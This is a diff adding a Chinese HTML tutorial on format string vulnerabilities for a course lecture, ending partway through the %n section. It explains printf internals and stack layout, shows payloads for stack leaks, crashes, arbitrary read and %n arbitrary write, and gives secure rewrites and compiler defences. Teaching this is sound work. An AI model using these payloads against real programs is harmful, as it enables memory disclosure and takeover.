@@ -1,0 +1,955 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>格式化字符串漏洞 · 图解讲解</title>
+<style>
+:root{
+  --bg:#f5f7fa; --card:#ffffff; --ink:#1f2328; --ink2:#4b5563; --ink3:#6b7280;
+  --line:#e3e7ed; --blue:#2563eb; --blue-bg:#eff5ff; --red:#dc2626; --red-bg:#fef2f2;
+  --green:#059669; --green-bg:#ecfdf5; --amber:#b45309; --amber-bg:#fffbeb;
+  --purple:#7c3aed; --purple-bg:#f5f3ff; --mono:'SFMono-Regular',Consolas,'Liberation Mono',Menlo,monospace;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  line-height:1.75;font-size:15px}
+.wrap{max-width:1080px;margin:0 auto;padding:0 20px 80px}
+header{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;padding:38px 20px 30px;margin-bottom:26px}
+header .inner{max-width:1080px;margin:0 auto;padding:0 20px}
+header h1{margin:0 0 8px;font-size:27px;letter-spacing:.5px}
+header p{margin:0;opacity:.9;font-size:14px}
+header .tags{margin-top:14px;display:flex;flex-wrap:wrap;gap:8px}
+header .tags span{background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.25);
+  padding:3px 11px;border-radius:20px;font-size:12.5px}
+
+nav{position:sticky;top:0;z-index:50;background:rgba(255,255,255,.94);backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);margin-bottom:26px}
+nav .inner{max-width:1080px;margin:0 auto;padding:0 20px;display:flex;gap:4px;overflow-x:auto}
+nav a{color:var(--ink2);text-decoration:none;font-size:13.5px;padding:11px 11px;white-space:nowrap;border-bottom:2px solid transparent}
+nav a:hover{color:var(--blue)}
+nav a.on{color:var(--blue);border-bottom-color:var(--blue);font-weight:600}
+
+section{background:var(--card);border:1px solid var(--line);border-radius:14px;
+  padding:26px 28px;margin-bottom:22px;scroll-margin-top:60px}
+h2{font-size:20px;margin:0 0 6px;display:flex;align-items:center;gap:10px}
+h2 .num{background:var(--blue);color:#fff;width:26px;height:26px;border-radius:8px;
+  display:inline-flex;align-items:center;justify-content:center;font-size:14px;flex:none}
+h3{font-size:16px;margin:22px 0 8px;color:var(--ink)}
+p{margin:9px 0;color:var(--ink2)}
+ul,ol{margin:9px 0;padding-left:22px;color:var(--ink2)}
+li{margin:5px 0}
+code{font-family:var(--mono);background:#f1f3f7;padding:1.5px 5px;border-radius:4px;font-size:13px;color:#b91c1c}
+pre{background:#0f172a;color:#e2e8f0;padding:15px 17px;border-radius:10px;overflow-x:auto;
+  font-family:var(--mono);font-size:12.8px;line-height:1.7;margin:12px 0}
+pre .c{color:#7f9cbf}.k{color:#f472b6}.s{color:#86efac}.n{color:#fbbf24}
+
+.box{border-radius:10px;padding:13px 16px;margin:13px 0;border-left:4px solid;font-size:14px}
+.box p{margin:5px 0}
+.box b{color:var(--ink)}
+.tip{background:var(--blue-bg);border-color:var(--blue)}
+.warn{background:var(--red-bg);border-color:var(--red)}
+.ok{background:var(--green-bg);border-color:var(--green)}
+.q{background:var(--amber-bg);border-color:var(--amber)}
+.pu{background:var(--purple-bg);border-color:var(--purple)}
+
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left}
+th{background:#f8fafc;font-weight:600;color:var(--ink)}
+td{color:var(--ink2)}
+td code,th code{background:#f1f3f7}
+
+/* ---- stack viz ---- */
+.stack{font-family:var(--mono);font-size:13px;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:12px 0}
+.srow{display:flex;align-items:center;gap:10px;padding:8px 12px;border-bottom:1px solid var(--line);
+  transition:background .25s,transform .25s}
+.srow:last-child{border-bottom:none}
+.srow .addr{color:var(--ink3);width:110px;flex:none;font-size:12px}
+.srow .val{flex:1;font-weight:600}
+.srow .lbl{color:var(--ink3);font-size:12px;width:180px;flex:none;text-align:right}
+.srow.hi{background:#fef3c7;transform:translateX(4px)}
+.srow.used{background:#ecfdf5}
+.srow.bad{background:#fee2e2}
+.srow.fmt{background:var(--blue-bg)}
+.srow.ret{background:#f3f4f6}
+.srow .arrow{width:20px;color:var(--blue);font-weight:700}
+
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:820px){.grid{grid-template-columns:1fr}}
+.mini{background:#f8fafc;border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+
+.ctrl{display:flex;flex-wrap:wrap;gap:9px;align-items:center;margin:12px 0}
+button{background:var(--blue);color:#fff;border:none;padding:8px 16px;border-radius:8px;
+  font-size:13.5px;cursor:pointer;font-family:inherit;transition:.15s}
+button:hover{background:#1d4ed8}
+button.ghost{background:#fff;color:var(--ink2);border:1px solid var(--line)}
+button.ghost:hover{background:#f3f4f6;border-color:#cbd5e1}
+button:disabled{opacity:.4;cursor:not-allowed}
+input[type=text],input[type=number],select{font-family:var(--mono);font-size:13px;padding:7px 10px;
+  border:1px solid var(--line);border-radius:7px;background:#fff;color:var(--ink)}
+input:focus,select:focus{outline:none;border-color:var(--blue)}
+label{font-size:13px;color:var(--ink2);font-family:inherit}
+
+.out{background:#0f172a;color:#e2e8f0;font-family:var(--mono);font-size:13px;
+  padding:13px 16px;border-radius:9px;margin-top:10px;min-height:44px;white-space:pre-wrap;word-break:break-all}
+.out .em{color:#fbbf24}
+.out .bad{color:#f87171}
+.out .good{color:#86efac}
+
+.quiz{border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin:12px 0;background:#fcfcfd}
+.quiz .qt{font-weight:600;color:var(--ink);margin-bottom:8px}
+.quiz .ans{display:none;margin-top:10px;padding-top:10px;border-top:1px dashed var(--line);color:var(--ink2);font-size:14px}
+.quiz.open .ans{display:block}
+
+.foot{text-align:center;color:var(--ink3);font-size:12.5px;margin-top:34px}
+.spec{display:inline-block;font-family:var(--mono);background:#f1f3f7;border:1px solid var(--line);
+  border-radius:6px;padding:1px 7px;margin:2px 3px 2px 0;font-size:12.5px}
+.hl{background:linear-gradient(transparent 62%,#fde68a 62%);font-weight:600;color:var(--ink)}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="inner">
+    <h1>格式化字符串漏洞 · 从"看不懂 %n"到"能自己算 payload"</h1>
+    <p>配套《第2讲 软件安全 2-2》课件 · 全程 32 位 x86 / Linux / cdecl 调用约定</p>
+    <div class="tags">
+      <span>printf 可变参数</span><span>栈布局</span><span>%08x 泄露</span><span>%s 任意读</span>
+      <span>%n 任意写</span><span>%[n]c 控制数值</span><span>DoS</span><span>二次溢出</span><span>防御</span>
+    </div>
+  </div>
+</header>
+
+<nav><div class="inner" id="nav">
+  <a href="#s0">先搞懂一句话</a>
+  <a href="#s1">1. printf 怎么干活</a>
+  <a href="#s2">2. 参数在栈上</a>
+  <a href="#s3">3. 泄露栈数据</a>
+  <a href="#s4">4. 任意读 %s</a>
+  <a href="#s5">5. 任意写 %n</a>
+  <a href="#s6">6. 写指定数值</a>
+  <a href="#s7">7. 课堂两道题</a>
+  <a href="#s8">8. DoS</a>
+  <a href="#s9">9. 二次溢出</a>
+  <a href="#s10">10. 防御</a>
+  <a href="#s11">11. 溢出家族</a>
+  <a href="#s12">12. 课程代码实战</a>
+  <a href="#s13">13. 自测</a>
+</div></nav>
+
+<div class="wrap">
+
+<!-- 0 -->
+<section id="s0">
+  <h2><span class="num">0</span>先搞懂一句话（这一节是整章的地基）</h2>
+
+  <div class="box tip">
+    <p><b>printf 的第一个参数不是"要打印的文字"，而是一段"程序"。</b></p>
+    <p>里面的 <code>%</code> 是<b>指令</b>：<code>%d</code> 的意思是"去栈上取 4 个字节，当整数打印出来"。而 printf <b>在执行时完全不知道你到底传了几个参数</b>，它只是一边读这段"程序"，一边从栈上按顺序取。</p>
+  </div>
+
+  <h3>0.1 先看正常情况：% 是"指令"，不是文字</h3>
+  <pre><span class="c">/* demo0.c —— 建立正确认知 */</span>
+<span class="k">#include</span> <span class="s">&lt;stdio.h&gt;</span>
+<span class="k">int</span> main(<span class="k">void</span>){
+    <span class="k">int</span> i = 5, a = 10;
+    printf(<span class="s">"[1] Number %d has no address, number %d has: %08x\n"</span>, i, a, &amp;a);
+    printf(<span class="s">"[2] 折扣 100%%\n"</span>);      <span class="c">/* 想打印一个真正的 '%' 字符，必须写 %% */</span>
+    <span class="k">return</span> 0;
+}</pre>
+  <p>编译运行：</p>
+  <pre>gcc -m32 demo0.c -o demo0 &amp;&amp; ./demo0
+
+[1] Number 5 has no address, number 10 has: 0xbfffebf4
+[2] 折扣 100%</pre>
+  <p><b>逐条解释：</b></p>
+  <ul>
+    <li>第 <code>[1]</code> 行：格式串里有 3 个 <code>%</code> 指令（<code>%d</code>、<code>%d</code>、<code>%08x</code>），后面正好给了 3 个参数（<code>i</code>、<code>a</code>、<code>&amp;a</code>）→ <b>一一对应，正确</b>。</li>
+    <li>第 <code>[2]</code> 行：<code>%%</code> 不是"取参数"，它是<b>转义</b>，表示"我就要打印一个百分号"。这也从侧面证明了：<code>%</code> 在格式串里是<b>特殊字符</b>，不是普通文字。</li>
+  </ul>
+
+  <h3>0.2 关键问题：printf 到底知不知道你传了几个参数？</h3>
+  <div class="box warn">
+    <p><b>不知道。一个字都不知道。</b></p>
+    <p>看它的声明：<code>int printf(const char *format, ...);</code> —— 那个 <code>...</code>（省略号）在 C 语言里叫<b>可变参数</b>。编译后的机器码里<b>既没有参数个数，也没有参数类型</b>，只有一串连续的 4 字节值躺在栈上。</p>
+    <p>printf 唯一的信息来源，就是 <code>format</code> 这个字符串本身。</p>
+  </div>
+
+  <p>printf 内部（glibc 里真正干活的叫 <code>vfprintf</code>）做的事，简化成模型是这样的：</p>
+  <pre><span class="c">/* printf 的极简模型 —— 说明它为什么不做检查 */</span>
+<span class="k">#include</span> <span class="s">&lt;stdarg.h&gt;</span>
+<span class="k">void</span> my_printf(<span class="k">const char</span> *fmt, ...){
+    va_list ap;                 <span class="c">/* ap = "参数指针"，指向栈上某个位置 */</span>
+    va_start(ap, fmt);          <span class="c">/* 让 ap 指向 fmt 后面的第 1 个参数 */</span>
+
+    <span class="k">for</span> (<span class="k">const char</span> *p = fmt; *p; ){
+        <span class="k">if</span> (*p != <span class="s">'%'</span>) { putchar(*p++); <span class="k">continue</span>; }   <span class="c">/* 普通字符：原样输出 */</span>
+        p++;                                            <span class="c">/* 跳过 '%' */</span>
+        <span class="k">switch</span> (*p++) {
+        <span class="k">case</span> <span class="s">'d'</span>: print_int( va_arg(ap, <span class="k">int</span>)     ); <span class="k">break</span>;  <span class="c">/* 掏4字节，ap += 4 */</span>
+        <span class="k">case</span> <span class="s">'x'</span>: print_hex( va_arg(ap, <span class="k">unsigned</span>) ); <span class="k">break</span>;  <span class="c">/* 掏4字节，ap += 4 */</span>
+        <span class="k">case</span> <span class="s">'s'</span>: print_str( va_arg(ap, <span class="k">char</span>*)   ); <span class="k">break</span>;  <span class="c">/* 掏4字节，当地址去读 */</span>
+        <span class="k">case</span> <span class="s">'n'</span>: *(<span class="k">int</span>*)va_arg(ap, <span class="k">int</span>*) = 已输出字符数; <span class="k">break</span>; <span class="c">/* 掏4字节，往里写！ */</span>
+        }
+    }
+    va_end(ap);
+}</pre>
+  <div class="box q">
+    <p><b>只要把上面这段读懂，整章就通了。</b></p>
+    <p><code>va_arg(ap, 类型)</code> 的含义就是：<b>从 ap 现在指着的地方取走 4 个字节，然后 ap 往后挪 4</b>。</p>
+    <p>它<b>没有任何"还剩几个参数"的检查</b>。整个循环完全由格式串里的 <code>%</code> 驱动 —— 格式串说要 5 个，它就掏 5 个；哪怕你一个都没传，它也照掏不误，掏的是后面别人的数据。</p>
+  </div>
+
+  <h3>0.3 用代码亲眼看一次"不匹配"会怎样</h3>
+  <pre><span class="c">/* demo1.c —— 多给 vs 少给 */</span>
+<span class="k">#include</span> <span class="s">&lt;stdio.h&gt;</span>
+<span class="k">int</span> main(<span class="k">void</span>){
+    printf(<span class="s">"[A] %d\n"</span>, 1, 2, 3);        <span class="c">/* 多给了 2 个 */</span>
+    printf(<span class="s">"[B] %d %d %d\n"</span>, 1, 2);     <span class="c">/* 少给了 1 个 → 未定义行为 */</span>
+    <span class="k">return</span> 0;
+}</pre>
+  <pre>[A] 1                    <span class="c">← 多余的 2、3 被安静地忽略，无害</span>
+[B] 1 2 134520896          <span class="c">← 第三个是"借"来的栈上垃圾，每次运行都可能不同</span></pre>
+  <div class="box warn">
+    <p><b>注意 [B]：</b>它<b>没有报错、没有崩溃</b>，只是老实巴交地把栈上紧跟着的 4 个字节打印了出来。这就是<b>信息泄露</b> —— 而且是完全静默的。</p>
+    <p>严格说这属于 C 语言的<b>未定义行为（UB）</b>，但现实中它稳定地"读出栈上后面的内容"，所以可以被稳定利用。</p>
+  </div>
+
+  <h3>0.4 漏洞现场：格式串来自用户</h3>
+  <p>前面讨论的都是"程序员写死格式串"的情况。真正的漏洞长这样：</p>
+  <pre><span class="c">/* demo2.c —— 漏洞就是这个形状 */</span>
+<span class="k">#include</span> <span class="s">&lt;stdio.h&gt;</span>
+<span class="k">void</span> log_line(<span class="k">const char</span> *user){
+    printf(<span class="s">"[LOG] "</span>);
+    printf(user);       <span class="c">/* ☠ 漏洞点：user 是别人给的，却被当成"格式程序"执行 */</span>
+    printf(<span class="s">"\n"</span>);
+}
+<span class="k">int</span> main(<span class="k">void</span>){
+    log_line(<span class="s">"alice"</span>);                        <span class="c">/* 正常：没有 %，就只是普通文字 */</span>
+    log_line(<span class="s">"%08x.%08x.%08x.%08x"</span>);          <span class="c">/* 攻击者：读栈 */</span>
+    log_line(<span class="s">"%s%s%s%s%s%s%s"</span>);               <span class="c">/* 攻击者：崩溃 */</span>
+    <span class="k">return</span> 0;
+}</pre>
+  <pre>[LOG] alice
+[LOG] bfffebf4.0000000a.00000005.08048568   <span class="c">← 栈上的内存被打印出来了</span>
+[LOG] Segmentation fault (core dumped)      <span class="c">← 进程挂了</span></pre>
+  <p>三行输出的差别，<b>只在于 user 的内容</b> —— 代码一行没改。这就是漏洞的本质：<b>攻击者获得了"写 printf 指令"的权力</b>。</p>
+
+  <div class="box ok">
+    <p><b>修复只有一句：格式串必须是程序员写死的常量，用户输入永远只当数据。</b></p>
+    <pre style="margin:8px 0 0">printf(<span class="s">"%s"</span>, user);   <span class="c">/* 现在 user 里的 '%' 只是一个普通字符，永远不会被当成指令 */</span></pre>
+    <p>为什么这就安全了？因为现在 printf 拿到的格式串是<b>常量 <code>"%s"</code></b>，里面只有一条指令"取一个字符串参数并打印"，<code>user</code> 是被打印的数据，它里面的 <code>%n</code> 只是四个普通字符，不会被二次解析。</p>
+  </div>
+
+  <h3>0.5 三种危害等级（记住这张表，后面全是它的展开）</h3>
+  <table>
+    <tr><th>攻击者在 user 里写</th><th>printf 会做什么</th><th>后果</th></tr>
+    <tr><td><code>%x</code> <code>%p</code> <code>%d</code></td><td>把栈上的值<b>读</b>出来打印</td><td style="color:var(--amber)"><b>信息泄露</b>：地址、canary、密码</td></tr>
+    <tr><td><code>%s</code></td><td>把栈上的值<b>当地址</b>，去那个地址读字符串</td><td style="color:var(--amber)"><b>任意读</b> 或 <b>崩溃（DoS）</b></td></tr>
+    <tr><td><code>%n</code></td><td>把栈上的值<b>当地址</b>，把"已输出字符数"<b>写</b>进去</td><td style="color:var(--red)"><b>任意写</b>：改变量、改返回地址 → 拿 shell</td></tr>
+  </table>
+  <div class="box pu">
+    <p><b>把整章串成一句话：</b></p>
+    <p>因为 printf 不知道参数个数（0.2）→ 它会顺着栈一直往后掏（0.3）→ 如果格式串是用户控制的（0.4），用户就能指定"掏什么、按什么方式解释" → 于是从<b>看</b>到<b>读</b>再到<b>写</b>，一步步升级（0.5）。</p>
+  </div>
+
+  <h3>0.6 危险函数清单（凡是有"格式串"三个字的都算）</h3>
+  <table>
+    <tr><th>☠ 危险写法</th><th>✅ 安全写法</th></tr>
+    <tr><td><code>printf(user)</code></td><td><code>printf("%s", user)</code></td></tr>
+    <tr><td><code>fprintf(stderr, user)</code></td><td><code>fprintf(stderr, "%s", user)</code></td></tr>
+    <tr><td><code>sprintf(buf, user)</code></td><td><code>snprintf(buf, sizeof(buf), "%s", user)</code></td></tr>
+    <tr><td><code>syslog(LOG_INFO, user)</code></td><td><code>syslog(LOG_INFO, "%s", user)</code></td></tr>
+    <tr><td><code>err(1, user)</code> / <code>warn(user)</code></td><td><code>err(1, "%s", user)</code> / <code>warn("%s", user)</code></td></tr>
+  </table>
+  <p>家族成员：<code>printf / fprintf / sprintf / snprintf / vprintf / vfprintf / vsprintf / vsnprintf / syslog / err / warn / errx / warnx / setproctitle …</code></p>
+  <div class="box tip">
+    <p><b>别以为 <code>snprintf</code> 就安全</b>：它只保证<b>不越界写</b>。写成 <code>snprintf(buf, n, user)</code> 的话，格式串漏洞照样成立 —— 照样能读栈、照样能用 <code>%n</code> 写内存。<b>"限长"和"格式"是两回事。</b></p>
+  </div>
+
+  <h3>0.7 自己试一下：这段输入丢进 <code>printf(user)</code> 会怎样？</h3>
+  <div class="mini">
+    <div class="ctrl">
+      <label>输入：</label>
+      <input type="text" id="tryIn" value="hello %s %n" style="width:300px">
+      <button onclick="tryCheck()">检查</button>
+    </div>
+    <div class="out" id="tryOut">点"检查"看分析结果</div>
+  </div>
+  <div class="box ok">
+    <p><b>编译器能帮你抓：</b><code>gcc -Wformat -Wformat-security -D_FORTIFY_SOURCE=2</code> 会对 <code>printf(user)</code> 这种"非字面量格式串"直接报警告；加上 <code>-Werror=format-security</code> 可以把它变成编译错误。这是最省钱的防御。</p>
+  </div>
+</section>
+
+<!-- 1 -->
+<section id="s1">
+  <h2><span class="num">1</span>printf 到底怎么干活</h2>
+  <pre><span class="k">int</span> printf(<span class="k">const char</span> *format, ...);
+printf(<span class="s">"Number %d has no address, number %d has: %08x\n"</span>, i, a, &amp;a);</pre>
+  <p>printf 内部是一个<b>逐字符扫描</b>的循环：</p>
+  <ol>
+    <li>读到普通字符（<code>N</code>、<code>u</code>、<code>m</code>…）→ 原样复制到输出缓冲区。</li>
+    <li>读到 <code>%</code> → 看后面那个字母决定"这次要取一个什么类型的参数"，然后<b>从当前参数指针位置取走 4 字节</b>，参数指针往后挪一格。</li>
+    <li>格式串扫完 → 结束。<b>它不会回头检查你到底给了几个参数。</b></li>
+  </ol>
+
+  <h3>常用说明符速查</h3>
+  <table>
+    <tr><th>写法</th><th>含义</th><th>取参数方式</th></tr>
+    <tr><td><code>%d</code></td><td>有符号十进制整数</td><td>取 4 字节，当整数打印</td></tr>
+    <tr><td><code>%u</code></td><td>无符号十进制</td><td>取 4 字节</td></tr>
+    <tr><td><code>%x</code> / <code>%08x</code></td><td>十六进制（<code>08</code>=不足8位左边补0）</td><td>取 4 字节</td></tr>
+    <tr><td><code>%p</code></td><td>指针（16 进制）</td><td>取 4 字节</td></tr>
+    <tr><td><code>%c</code></td><td>字符</td><td>取 4 字节，<b>只输出最低 1 字节对应的 ASCII 字符</b></td></tr>
+    <tr><td><code>%s</code></td><td>字符串</td><td>取 4 字节<b>当地址</b>，去那个地址读到 <code>\0</code> 为止</td></tr>
+    <tr><td><code>%n</code></td><td><span style="color:var(--red)"><b>不输出，反而写入</b></span></td><td>取 4 字节<b>当地址</b>，把"目前已输出的字符总数"写进去</td></tr>
+    <tr><td><code>%10d</code></td><td>宽度 10</td><td>不够 10 位左边补空格；超过就按实际位数</td></tr>
+    <tr><td><code>%2$d</code></td><td>位置参数</td><td>直接取<b>第 2 个</b>参数（跳过中间的）</td></tr>
+    <tr><td><code>%hn</code></td><td>半字写入</td><td>写 2 字节（实战常用，见第 6 节）</td></tr>
+  </table>
+  <p><code>printf("%2$d", 10, 20, 30)</code> → 输出 <code>20</code>。</p>
+</section>
+
+<!-- 2 -->
+<section id="s2">
+  <h2><span class="num">2</span>参数到底在栈的哪里（课件"补充讲解"那几页）</h2>
+  <p>x86 32 位 + cdecl：<b>参数从右往左依次 push</b>，然后 <code>call</code> 再把返回地址压进去。所以进到 printf 时，栈长这样（下面每行 4 字节）：</p>
+
+  <div class="stack" id="stk1">
+    <div class="srow ret"><span class="arrow"></span><span class="addr">高地址</span><span class="val">… main 的局部变量 / 调用者栈帧 …</span><span class="lbl"></span></div>
+    <div class="srow" data-slot="3"><span class="arrow"></span><span class="addr">0xbfffebe4</span><span class="val">0xbfffebf4</span><span class="lbl">← 第3个参数 &amp;a（a 的地址）</span></div>
+    <div class="srow" data-slot="2"><span class="arrow"></span><span class="addr">0xbfffebe0</span><span class="val">0x0000000a</span><span class="lbl">← 第2个参数 a</span></div>
+    <div class="srow" data-slot="1"><span class="arrow"></span><span class="addr">0xbfffebdc</span><span class="val">0x00000005</span><span class="lbl">← 第1个参数 i</span></div>
+    <div class="srow fmt"><span class="arrow"></span><span class="addr">0xbfffebd8</span><span class="val">0x08048568</span><span class="lbl">← format 串的地址</span></div>
+    <div class="srow ret"><span class="arrow"></span><span class="addr">0xbfffebd4</span><span class="val">0x080484a1</span><span class="lbl">← RET 返回地址</span></div>
+    <div class="srow ret"><span class="arrow"></span><span class="addr">低地址</span><span class="val">… printf 自己的栈帧 …</span><span class="lbl"></span></div>
+  </div>
+
+  <div class="box q">
+    <p><b>课件里那个"？"：<code>0xbfffebe8</code> 为什么不等于 <code>0xbfffebf4</code>？</b></p>
+    <p>这俩是<b>两码事</b>：
+    <br>· <code>0xbfffebf4</code> 是 <b>main 里局部变量 a 的真实地址</b>（也就是 <code>&amp;a</code> 这个<b>值</b>）；
+    <br>· <code>0xbfffebe8</code> 是 <b>printf 参数区里"存放 &amp;a 这一格"的地址</b>。</p>
+    <p>你在 gdb 里 <code>x/wx 0xbfffebe8</code>，看到的内容正是 <code>0xbfffebf4</code>。就像"抽屉的编号"和"抽屉里放的钥匙"不是一回事。</p>
+  </div>
+
+  <div class="box tip">
+    <p><b>call printf 之前那 4 个 push 在干嘛？</b> —— 按<b>从右往左</b>的顺序把参数压栈：</p>
+    <pre style="margin:8px 0 0">lea  edx,[ebp-0x8]   <span class="c">; 取 a 的地址</span>
+push edx             <span class="c">; ④ &amp;a 入栈</span>
+mov  eax,[ebp-0x8]
+push eax             <span class="c">; ③ a 的值入栈</span>
+push dword [ebp-0x4] <span class="c">; ② i 的值入栈</span>
+push 0x8048568       <span class="c">; ① 格式串地址入栈</span>
+call printf</pre>
+  </div>
+</section>
+
+<!-- 3 -->
+<section id="s3">
+  <h2><span class="num">3</span>交互演示：参数没给够，printf 去哪儿拿？</h2>
+  <p>下面这个模拟器就是漏洞现场。左边是格式串，右边是栈。<b>点"单步执行"</b>，看 printf 怎么一格一格往后掏参数 —— 掏到没有参数的地方，就把<b>别人的数据</b>掏出来了。</p>
+
+  <div class="ctrl">
+    <label>格式串：</label>
+    <input type="text" id="fmtIn" value="%d %d %d %d" style="width:200px">
+    <label>实际传入参数：</label>
+    <input type="text" id="argIn" value="10, 20" style="width:130px">
+    <button class="ghost" onclick="simReset()">重置</button>
+    <button onclick="simStep()">单步执行 ▶</button>
+    <button class="ghost" onclick="simAll()">跑到底 ⏭</button>
+  </div>
+
+  <div class="grid">
+    <div>
+      <div class="stack" id="stk2"></div>
+    </div>
+    <div>
+      <div class="mini">
+        <div style="font-size:13px;color:var(--ink3);margin-bottom:6px">当前扫描位置</div>
+        <div id="scanPos" style="font-family:var(--mono);font-size:14px;word-break:break-all;min-height:24px"></div>
+      </div>
+      <div style="font-size:13px;color:var(--ink3);margin:12px 0 6px">程序输出</div>
+      <div class="out" id="simOut"></div>
+      <div id="simNote" style="margin-top:10px;font-size:13.5px;color:var(--ink2)"></div>
+    </div>
+  </div>
+
+  <div class="box warn">
+    <p><b>结论：</b>参数不够时 printf 不会报错，它<b>顺着栈往高地址继续掏</b>。掏出来的可能是上一个函数的局部变量、保存在栈上的寄存器、某个指针、甚至是格式串本身的内容。这就是<b>信息泄露</b>。</p>
+  </div>
+
+  <h3>所以 <code>printf("%08x.%08x.%08x.%08x")</code> 会输出什么？</h3>
+  <p>输出的<b>不是</b>字面量，而是栈上 4 个格子里的值，每个按 8 位十六进制补零打印，例如：</p>
+  <pre>bfffebf4.0000000a.00000005.08048568</pre>
+  <p>课件里那张 ASCII 表（<code>%</code>=0x25、<code>0</code>=0x30、<code>8</code>=0x38、<code>x</code>=0x78）是提醒你：<b>格式串本身也是以字节形式存在栈上的</b>，所以它能被自己读到。</p>
+</section>
+
+<!-- 4 -->
+<section id="s4">
+  <h2><span class="num">4</span>从"泄露"升级到"任意读"：把地址塞进格式串</h2>
+  <p>想读任意地址的内容，需要凑齐两件事：</p>
+  <div class="grid">
+    <div class="mini"><b>① 一个"把参数当地址"的说明符</b><br><code>%s</code> —— 从栈上取 4 字节当地址，打印那个地址处的字符串。</div>
+    <div class="mini"><b>② 能把地址放到栈上</b><br>格式串本身（<code>buf</code>）就在栈上 → 直接把地址写进格式串里。</div>
+  </div>
+  <p>剩下的问题只是："<b>怎么让参数指针正好停在我塞进去的那个地址上</b>"：</p>
+  <pre>printf(<span class="s">"\x1f\x01\xff\xbf_%08x.%08x|%s|"</span>);
+<span class="c">//       ↑ 目标地址0xbfff011f   ↑ 用 %08x 把指针"空转"两步   ↑ 到站，读！</span></pre>
+  <div class="box tip">
+    <p><b>那个 <code>_</code> 是干嘛的？</b> 地址占 4 字节，栈是按 4 字节对齐读的。补 1 个填充字符，让这 4 字节地址正好落在某一格的开头，<code>%s</code> 才会精准取到它。<b>不对齐就读歪了。</b></p>
+  </div>
+
+  <h3>更省事：位置参数 <code>%M$s</code></h3>
+  <p>不用数 <code>%08x</code> 的个数，直接说"我要第 3 个参数"：</p>
+  <pre>printf(<span class="s">"\xaa\xbb\xcc\xdd%3$s"</span>);
+
+  <span class="c">栈（从参数1开始数）：</span>
+  [ RET ][ fmt ][ a1 ][ a2 ][ <span class="n">\xaa\xbb\xcc\xdd%3$s</span> ]
+                 (1)   (2)   (3)  ← fmt 本身所在的缓冲区
+        <span class="c">└────────────────────────────┘</span>
+        <span class="c">%3$s 直接跳到第3格 → 取到 0xddccbbaa 当地址 → 打印它指向的字符串</span></pre>
+  <div class="box ok">
+    <p><b>一句话记法：</b><code>%M$s</code> = "把我塞进去的第 M 个 4 字节当地址，把那里的字符串打出来"。位置参数只是"移动参数指针"的语法糖，本质和堆 <code>%08x</code> 完全一样。</p>
+  </div>
+  <p>课件那个实例：<code>printf("\x1f\x01\xff\xbf_%08x.%08x.%08x.%08x.%08x|%s|")</code> 打出了 <code>"Invalid Password!!!"</code> —— 内存里的敏感字符串被偷出来了。注意课件特意标了 <code>I n v a</code> → <code>49 6e 76 61</code>，而实际内存是 <code>61 76 6e 49</code>，这就是 <b>x86 小端序</b>。</p>
+</section>
+
+<!-- 5 -->
+<section id="s5">
+  <h2><span class="num">5</span>核心难点：%n —— 不是打印，是写入</h2>
+  <div class="box warn">
+    <p><code>%n</code> <b>不产生任何输出</b>。它做的事是：<b>把"到 %n 为止，printf 已经输出的字符总数"，写进对应参数所指的那个地址</b>（32 位下写 4 字节）。</p>
+  </div>
+  <pre>printf(<span class="s">"1234%n"</span>, &amp;len);   <span class="c">// 屏幕输出 "1234"，同时 len = 4</span></pre>
+
+  <h3>课件那个 canary 例子（一次写 1 字节的 trick）</h3>
+  <pre><span class="k">unsigned char</span> canary[5];
+<span class="k">unsigned char</span> foo[4];
+memset(foo, <span class="s">'\x00'</span>, <span class="k">sizeof</span>(foo));
+strcpy(canary, <span class="s">"AAAA"</span>);
+
+printf(<span class="s">"%16u%n"</span>,  7350, (<span class="k">int</span>*)&amp;foo[0]);  <span class="c">// 已输出16 → foo[0] = 16  = 0x10</span>
+printf(<span class="s">"%32u%n"</span>,  7350, (<span class="k">int</span>*)&amp;foo[1]);  <span class="c">// 已输出32 → foo[1] = 32  = 0x20</span>
+printf(<span class="s">"%64u%n"</span>,  7350, (<span class="k">int</span>*)&amp;foo[2]);  <span class="c">// 已输出64 → foo[2] = 64  = 0x40</span>
+printf(<span class="s">"%128u%n"</span>, 7350, (<span class="k">int</span>*)&amp;foo[3]);  <span class="c">// 已输出128→ foo[3] = 128 = 0x80</span>
+
+printf(<span class="s">"foo: %02x%02x%02x%02x\n"</span>,    foo[0],foo[1],foo[2],foo[3]);
+printf(<span class="s">"canary: %02x%02x%02x%02x\n"</span>, canary[0],canary[1],canary[2],canary[3]);</pre>
+
+  <div class="out">foo:    <span class="good">10204080</span>
+canary: <span class="bad">00000041</span></div>
+
+  <div class="box q">
+    <p><b>为什么 canary 变成了 <code>00 00 00 41</code>？</b></p>
+    <p>因为 <code>canary</code> 紧跟在 <code>foo</code> 后面（<code>foo[4] + canary[5]</code> 连续）。<code>%n</code> 是<b>一次写 4 个字节</b>的，不是 1 个字节！</p>
+    <p>所以最后那句 <code>printf("%128u%n", &amp;foo[3])</code> 从 <code>foo[3]</code> 开始写 <code>0x80 0x00 0x00 0x00</code>（小端，128=0x00000080）→ 把 <code>foo[3]</code> 写成 <code>0x80</code>，然后<b>顺手踩掉了 canary[0..2]，全写成了 0x00</b>。</p>
+    <p>原来 canary 是 <code>41 41 41 41 00</code>（"AAAA"+"\0"），被踩之后只剩最后一个 <code>41</code> 在 canary[3] 位置 → 打印 <code>00 00 00 41</code>。</p>
+    <p><b>这正是"格式化字符串能越界写"的直观证据。</b></p>
+  </div>
+
+  <h3>把 %n 用到攻击上：任意地址写</h3>
+  <pre>printf(<span class="s">"\xaa\xbb\xcc\xdd%3$n"</span>);
+
